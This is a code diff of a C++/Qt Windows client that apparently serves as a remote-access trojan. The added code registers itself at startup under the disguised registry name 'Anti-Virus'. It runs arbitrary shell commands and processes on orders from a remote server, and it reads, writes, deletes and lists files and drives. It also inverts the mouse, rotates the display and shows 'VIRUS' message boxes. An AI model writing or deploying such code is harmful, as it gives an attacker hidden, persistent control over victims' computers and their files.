@@ -12,12 +12,23 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	tryToConnect();
 
 	compName = "Doru";
-	//addStartup();
+	addStartup();
+
+	thread = new QThread;
+	worker = new QMouseInverter();
+	worker->moveToThread(thread);
+	connect(thread, SIGNAL(started()), worker, SLOT(process()));
+	connect(worker, SIGNAL(finished()), thread, SLOT(quit()));
+	connect(worker, SIGNAL(finished()), worker, SLOT(deleteLater()));
+	connect(thread, SIGNAL(finished()), thread, SLOT(deleteLater()));
+	thread->start();
+
+	dir = QDir::currentPath();
 }
 
 void QClient::tryToConnect()
 {
-		sock->connectToHost(host, port);
+	sock->connectToHost(host, port);
 }
 
 void QClient::connected()
@@ -33,113 +44,137 @@ void QClient::disconnected()
 
 void QClient::readyRead()
 {
-	if (sock->bytesAvailable())
-	{
-		//read size of package then the JSON object
-		int blockSize = -1;
-		sock->read((char *)&blockSize, sizeof(int));
-		//should check whether the local machine is big endian
-		auto sz = qToLittleEndian(blockSize);
-		QByteArray data = sock->read(sz);
- 		QJsonDocument doc = QJsonDocument::fromJson(data);
-		QJsonObject resp;
-		qDebug() << data;
-		if (doc.isObject())
-		{
-			QJsonObject obj = doc.object();
-			if (obj.contains("Id") && obj.contains("Parameters"))
+			QByteArray data = sock->readAll();
+			//QByteArray data = sock->read(sz);
+			QJsonDocument doc = QJsonDocument::fromJson(data);
+			QJsonObject resp;
+			qDebug() << data;
+			if (doc.isObject())
 			{
-				int id = obj.value("Id").toInt();
-				QString response;
-				switch ((Commands)id)
+				QJsonObject obj = doc.object();
+				if (obj.contains("Id") && obj.contains("Parameters"))
 				{
-				case Commands::CmdInjection:
+					int id = obj.value("Id").toInt();
+					QJsonValue response;
+					switch ((Commands)id)
+					{
+					case Commands::CmdInjection:
+					{
+						QString cmd = obj.value("Parameters").toString();
+						response = runCmdCommand(cmd);
+						break;
+					}
+					case Commands::ExecProcess:
+					{
+						QString proc= obj.value("Parameters").toString();
+						startProcess(proc);
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::CreateFile:
+					{
+						QJsonArray params = obj.value("Parameters").toArray();
+						response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
+						break;
+					}
+					case Commands::ReadFile:
+					{
+						QString fileName = obj.value("Parameters").toString();
+						response = readFile(fileName);
+						break;
+					}
+					case Commands::DeleteFile:
+					{
+						QString fileName = obj.value("Parameters").toString();
+						response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
+						break;
+					}
+					case Commands::MouseInvert:
+					{
+						toggleInvertMouse();
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::DisplayRotate:
+					{
+						rotateDisplay();
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::OsMessage:
+					{
+						QString msg = obj.value("Parameters").toString();
+						message(msg);
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::GetFiles:
+					{
+						QString dir = obj.value("Parameters").toString();
+						auto files = getFiles(dir);
+						QJsonArray arr;
+						foreach(QString file, files)
+						{
+							arr.push_back(file);
+						}
+						response = arr;
+						break;
+					}
+					case Commands::GetDrives:
+					{
+						QString drives = getDrives();
+						response = drives;
+						break;
+					}
+					default:
+					{
+						response = "UNKNOWN COMMAND";
+					}
+					}
+					resp.insert("response", response);
+				}
+				else
 				{
-					response = "CmdInjection";
-					break;
+					QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
+					resp.insert("response", val);
 				}
-				case Commands::ExecProcess:
-				{
-					response = "ExecProcess";
-					break;
-				}
-				case Commands::CreateFile:
-				{
-					QJsonArray params = obj.value("Parameters").toArray();
-					response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
-					break;
-				}
-				case Commands::ReadFile:
-				{
-					QString fileName = obj.value("Parameters").toString();
-					response = readFile(fileName);
-					break;
-				}
-				case Commands::DeleteFile:
-				{
-					QString fileName = obj.value("Parameters").toString();
-					response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
-					break;
-				}
-				case Commands::MouseInvert:
-				{
-					response = "MouseInvert";
-					break;
-				}
-				case Commands::DisplayRotate:
-				{
-					rotateDisplay();
-					response = "SUCCESS";
-					break;
-				}
-				case Commands::OsMessage:
-				{
-					response = "OsMessage";
-					break;
-				}
-				default:
-				{
-					response = "UNKNOWN COMMAND";
-				}
-				}
-				QJsonValue val = response;
-				resp.insert("response", val);
 			}
 			else
 			{
-				QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
+				QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
 				resp.insert("response", val);
 			}
-		}
-		else
-		{
-			QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
-			resp.insert("response", val);
-		}
-		QByteArray dataToSend = (QJsonDocument(resp)).toJson();
-		qDebug() << dataToSend;
-		sendData(dataToSend);
-		//sock->flush();
-	}
+			QByteArray dataToSend = (QJsonDocument(resp)).toJson(QJsonDocument::Compact);
+			qDebug() << dataToSend;
+			sendData(dataToSend);
 }
 
 
 void QClient::addStartup()
 {
-	QString hkey("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+	QString hkey("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
 	QSettings settings(hkey, QSettings::NativeFormat);
-	QString path = QDir::currentPath() + "QClient.exe";
+	QString path = QDir::currentPath() + "\\QClient.exe";
 	settings.setValue("Anti-Virus", QVariant(path));
 }
 
-QString QClient::startProcess(const QString &proc)
+void QClient::startProcess(const QString &proc)
 {
-	return QString();
+	QProcess *process = new QProcess(this);
+	process->start(proc, QStringList() << dir);
 }
 
 QString QClient::runCmdCommand(const QString &cmd)
 {
-	return QString();
+	FILE * uname;
+	char os[800000];
+	int lastchar;
+
+	uname = _popen(cmd.toUtf8(), "r");
+	lastchar = fread(os, 1, 800000, uname);
+	os[lastchar] = '\0';
+	_pclose(uname);
+	return QString(os);
 }
 
 QString QClient::readFile(const QString &fileName)
@@ -177,7 +212,7 @@ bool QClient::deleteFile(const QString &fileName)
 
 void QClient::toggleInvertMouse()
 {
-
+	worker->toggleInverter();
 }
 
 void QClient::rotateDisplay()
@@ -231,18 +266,20 @@ void QClient::message(const QString &m)
 	MessageBox(NULL, (LPCWSTR)r.c_str(), L"VIRUS", MB_OK | MB_ICONERROR);
 }
 
+QList<QString> QClient::getFiles(const QString &src)
+{
+	QDir srcDir(src);
+	return srcDir.entryList(QStringList(), QDir::Files | QDir::Dirs);
+}
+
+QString QClient::getDrives()
+{
+	return runCmdCommand("wmic logicaldisk get caption");
+}
+
 void QClient::sendData(const QByteArray &data)
 {
-	
-	int size = data.size();
-	char s[4];
-	s[3] = size & 0xFF;
-	s[2] = (size >> 8) & 0xFF;
-	s[1] = (size >> 16) & 0xFF;
-	s[0] = (size >> 24) & 0xFF;
-
-	sock->write(s, 4);
-	sock->write(data);
+	sock->write(data);	
 	sock->waitForBytesWritten();
 }
 
